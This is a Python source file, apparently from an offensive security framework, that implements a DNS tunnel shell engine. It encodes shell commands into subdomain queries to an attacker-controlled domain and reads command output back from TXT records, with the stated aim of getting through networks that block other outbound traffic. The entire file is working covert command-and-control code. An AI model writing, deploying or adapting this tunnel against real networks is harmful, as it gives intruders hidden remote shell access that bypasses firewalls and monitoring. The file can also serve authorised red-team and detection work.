"""DNS tunnel shell engine.

Tunnels shell commands and output through DNS TXT queries and responses.
Commands are encoded in subdomain labels of an attacker-controlled domain;
output is returned in TXT record values.  Effective against networks that
allow outbound DNS but block most other protocols.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 0.1.0
"""

from __future__ import annotations

import base64
import hashlib
import logging
import secrets
import socket
import struct
import threading
import time
from typing import List, Optional, Tuple

from embedxpl.core.shells.shell_engine import (
    ShellConnectionError,
    ShellEngine,
    ShellIOError,
    ShellStatus,
    ShellTimeoutError,
)

logger = logging.getLogger(__name__)

_MAX_LABEL_LEN = 63
_MAX_QNAME_LEN = 253
_DNS_PORT = 53
_DNS_HDR_FMT = "!HHHHHH"
_DNS_HDR_SIZE = struct.calcsize(_DNS_HDR_FMT)
_QR_RESPONSE = 0x8000
_RTYPE_TXT = 16
_RCLASS_IN = 1


class DNSTunnelShell(ShellEngine):
    """Shell via DNS TXT queries (commands) and TXT responses (output).

    The engine requires an attacker-controlled authoritative DNS domain.
    Commands are base32-encoded and split across subdomain labels.
    Output arrives as base64-encoded TXT record values.

    Query format::

        <encoded_chunk>.<session_id>.<base_domain>  TXT IN

    Response: standard DNS reply with one or more TXT RRs whose
    concatenated rdata contains the base64-encoded shell output.

    Args:
        remote_host: DNS resolver to query (IP or hostname).
        remote_port: DNS port (default 53).
        base_domain: Attacker-controlled domain, e.g. "c2.example.com".
        timeout: Per-query timeout in seconds.
        poll_interval: Seconds between polling queries when waiting
                       for output.
    """

    def __init__(
        self,
        remote_host: str,
        remote_port: int = _DNS_PORT,
        base_domain: str = "",
        timeout: float = 10.0,
        poll_interval: float = 1.0,
    ) -> None:
        super().__init__(
            remote_host=remote_host,
            remote_port=remote_port,
            transport_type="dns_tunnel",
            timeout=timeout,
        )
        if not base_domain:
            raise ValueError("base_domain is required for DNS tunnel shell")
        self._base_domain: str = base_domain.strip(".").lower()
        self._poll_interval: float = max(0.2, poll_interval)
        self._session_id: str = secrets.token_hex(4)
        self._sock: Optional[socket.socket] = None
        self._tx_id: int = 0
        self._lock: threading.Lock = threading.Lock()

    # ------------------------------------------------------------------
    # Connection
    # ------------------------------------------------------------------

    def connect(self) -> bool:
        """Open a UDP socket toward the DNS resolver and send a handshake.

        Returns:
            True on success.

        Raises:
            ShellConnectionError: If socket creation fails.
        """
        self._set_status(ShellStatus.CONNECTING)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self._timeout)
            sock.connect((self._remote_host, self._remote_port))
            self._sock = sock
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellConnectionError(str(exc)) from exc

        try:
            self._dns_query("init.{}".format(self._session_id))
        except ShellIOError:
            logger.warning("DNS handshake query had no reply; proceeding anyway")

        self._set_status(ShellStatus.CONNECTED)
        logger.info(
            "DNS tunnel shell ready via %s:%d (domain=%s, session=%s)",
            self._remote_host,
            self._remote_port,
            self._base_domain,
            self._session_id,
        )
        return True

    # ------------------------------------------------------------------
    # I/O
    # ------------------------------------------------------------------

    def send(self, cmd: str) -> int:
        """Encode and send a command as a DNS TXT query.

        The command is base32-encoded (lowercase, no padding) and split
        into DNS-safe labels of up to 63 characters each.

        Args:
            cmd: Command string.

        Returns:
            Byte count of the original command.

        Raises:
            ShellIOError: On DNS send failures.
        """
        self._require_connected()
        raw = cmd.strip().encode("utf-8", errors="replace")
        encoded = base64.b32encode(raw).decode("ascii").rstrip("=").lower()
        labels = self._split_labels(encoded)
        qname = ".".join(labels + [self._session_id, self._base_domain])

        if len(qname) > _MAX_QNAME_LEN:
            raise ShellIOError(
                "Command too long for single DNS query ({} > {})".format(
                    len(qname), _MAX_QNAME_LEN
                )
            )

        self._dns_query(qname)
        return len(raw)

    def recv(self, timeout: Optional[float] = None) -> str:
        """Poll for output via DNS TXT queries.

        Sends a "poll" query and reads TXT record values from the
        response.

        Args:
            timeout: Override default timeout.

        Returns:
            Decoded shell output (empty if no data).

        Raises:
            ShellIOError: On socket errors.
        """
        self._require_connected()
        wait = timeout if timeout is not None else self._timeout
        deadline = time.monotonic() + wait
        output_parts: List[str] = []

        while time.monotonic() < deadline:
            qname = "poll.{}.{}".format(self._session_id, self._base_domain)
            try:
                txt_values = self._dns_query(qname)
            except ShellIOError:
                time.sleep(self._poll_interval)
                continue

            if txt_values:
                for val in txt_values:
                    try:
                        decoded = base64.b64decode(val).decode("utf-8", errors="replace")
                        output_parts.append(decoded)
                    except Exception:
                        output_parts.append(val)
                break

            remaining = deadline - time.monotonic()
            if remaining > self._poll_interval:
                time.sleep(self._poll_interval)
            else:
                break

        return "".join(output_parts)

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def close(self) -> None:
        """Send a teardown query and close the socket."""
        if self._sock is not None:
            try:
                qname = "fin.{}.{}".format(self._session_id, self._base_domain)
                self._dns_query(qname)
            except (ShellIOError, OSError):
                pass
            try:
                self._sock.close()
            except OSError:
                pass
        self._sock = None
        self._set_status(ShellStatus.DISCONNECTED)
        logger.info("DNSTunnelShell closed (session=%s)", self._session_id)

    def is_alive(self) -> bool:
        """Socket-level liveness check."""
        return (
            self._status == ShellStatus.CONNECTED
            and self._sock is not None
            and self._sock.fileno() != -1
        )

    # ------------------------------------------------------------------
    # DNS helpers
    # ------------------------------------------------------------------

    def _dns_query(self, qname: str) -> List[str]:
        """Build and send a raw DNS TXT query, return TXT rdata strings.

        Args:
            qname: Fully qualified query name.

        Returns:
            List of TXT record value strings from the response.

        Raises:
            ShellIOError: On network or parse errors.
        """
        tx_id = self._next_tx_id()
        pkt = self._build_query(tx_id, qname)
        try:
            self._sock.send(pkt)  # type: ignore[union-attr]
        except OSError as exc:
            raise ShellIOError("DNS send failed: {}".format(exc)) from exc

        try:
            resp = self._sock.recv(4096)  # type: ignore[union-attr]
        except socket.timeout:
            return []
        except OSError as exc:
            raise ShellIOError("DNS recv failed: {}".format(exc)) from exc

        return self._parse_txt_response(resp, tx_id)

    def _build_query(self, tx_id: int, qname: str) -> bytes:
        """Construct a minimal DNS query packet.

        Args:
            tx_id: Transaction ID.
            qname: Query name.

        Returns:
            Raw DNS packet bytes.
        """
        flags = 0x0100
        header = struct.pack(_DNS_HDR_FMT, tx_id, flags, 1, 0, 0, 0)
        question = self._encode_qname(qname)
        question += struct.pack("!HH", _RTYPE_TXT, _RCLASS_IN)
        return header + question

    @staticmethod
    def _encode_qname(qname: str) -> bytes:
        """Encode a dotted name into DNS wire format."""
        parts = qname.strip(".").split(".")
        buf = bytearray()
        for part in parts:
            encoded = part.encode("ascii")
            buf.append(len(encoded))
            buf.extend(encoded)
        buf.append(0)
        return bytes(buf)

    @staticmethod
    def _parse_txt_response(data: bytes, expected_id: int) -> List[str]:
        """Extract TXT record values from a DNS response packet.

        Args:
            data: Raw DNS response bytes.
            expected_id: Expected transaction ID.

        Returns:
            List of TXT rdata strings.
        """
        if len(data) < _DNS_HDR_SIZE:
            return []

        tx_id, flags, qd_count, an_count, _, _ = struct.unpack_from(
            _DNS_HDR_FMT, data
        )
        if tx_id != expected_id:
            return []
        if not (flags & _QR_RESPONSE):
            return []

        offset = _DNS_HDR_SIZE
        for _ in range(qd_count):
            offset = DNSTunnelShell._skip_name(data, offset)
            offset += 4

        results: List[str] = []
        for _ in range(an_count):
            offset = DNSTunnelShell._skip_name(data, offset)
            if offset + 10 > len(data):
                break
            rtype, rclass, _, rdlen = struct.unpack_from("!HHIH", data, offset)
            offset += 10
            if rtype == _RTYPE_TXT and offset + rdlen <= len(data):
                txt_offset = offset
                end = offset + rdlen
                while txt_offset < end:
                    txt_len = data[txt_offset]
                    txt_offset += 1
                    if txt_offset + txt_len <= end:
                        results.append(
                            data[txt_offset : txt_offset + txt_len].decode(
                                "ascii", errors="replace"
                            )
                        )
                    txt_offset += txt_len
            offset += rdlen

        return results

    @staticmethod
    def _skip_name(data: bytes, offset: int) -> int:
        """Skip a DNS name (handles pointers and labels)."""
        while offset < len(data):
            length = data[offset]
            if length == 0:
                return offset + 1
            if (length & 0xC0) == 0xC0:
                return offset + 2
            offset += 1 + length
        return offset

    @staticmethod
    def _split_labels(text: str) -> List[str]:
        """Split a string into DNS-safe labels (max 63 chars each)."""
        return [
            text[i : i + _MAX_LABEL_LEN]
            for i in range(0, len(text), _MAX_LABEL_LEN)
        ]

    def _next_tx_id(self) -> int:
        with self._lock:
            self._tx_id = (self._tx_id + 1) & 0xFFFF
        return self._tx_id

    def _require_connected(self) -> None:
        if self._status != ShellStatus.CONNECTED or self._sock is None:
            raise ShellIOError(
                "Shell not connected (status={})".format(self._status.value)
            )
